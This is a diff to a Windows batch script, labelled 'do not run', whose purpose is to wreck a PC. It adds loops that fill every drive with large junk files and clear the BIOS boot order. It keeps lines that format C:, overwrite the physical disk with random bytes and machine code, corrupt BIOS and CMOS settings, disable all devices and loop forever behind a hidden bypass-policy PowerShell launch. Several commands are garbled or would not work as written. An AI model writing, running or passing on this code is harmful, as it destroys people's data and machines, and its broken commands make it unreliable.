@@ -1,5 +1,6 @@
 rem PLEASE DO NOT RUN THIS BATCH FILE!!! I AM NOT RESPONSIBLE FOR BROKEN PC's
 @echo off
+setlocal enabledelayedexpansion
 
 if not "%1"=="bios_level" (
     powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
@@ -22,16 +23,15 @@ if not "%1"=="bios_level" (
 )
 
 :RIP
-
+for %%d in (c d e f g h i j k l m n o p q r s t u v w x y z) do (
+    fsutil file createnew %%d:\crash.zero 1000000000 >nul 2>&1
+)
 fsutil file createnew C:\wormhole\portal.sys 1073741824 >nul 2>&1
 mklink /j C:\Windows\System32\drivers\etc\hosts C:\wormhole\portal.sys >nul 2>&1
 mklink /j C:\wormhole\portal.sys C:\Windows >nul 2>&1
-
 set /a entropy=%random%^%random%^%random%
 for /l %%i in (1,1,1000000) do set /a entropy=entropy^!random!
-
 echo 0F 0B | xxd -r -p | debug >nul 2>&1
-
 debug >nul 2>&1 <<EOF
 o 70 2e
 o 71 ff
@@ -39,25 +39,20 @@ o 70 2f
 o 71 ff
 q
 EOF
-
 for /l %%c in (1,1,255) do (
     devcon disable * >nul 2>&1
     devcon enable * >nul 2>&1
 )
-
 wmic process call create "cmd /c echo y| format c: /fs:NULL /x /p:3" >nul 2>&1
 wmic bios set SerialNumber="CORRUPTED" >nul 2>&1
 wmic path win32_physicalmedia where "MediaType like '%SSD%'" call write 0,0,0 >nul 2>&1
-
-
 set "chars=0123456789ABCDEF"
 for /l %%s in (1,1,100000) do (
     set /a r=!random! %% 65536
     echo !chars:~%r%,1! >> C:\zero.bin
     type C:\zero.bin > \\.\PhysicalDrive0
 )
-
-
 echo 5E 1F 7C 00 00 48 C7 C0 3C 00 00 00 0F 05 | xxd -r -p > \\.\PhysicalDrive0
+wmic bios set BootOrder= >nul 2>&1
 
 goto RIP
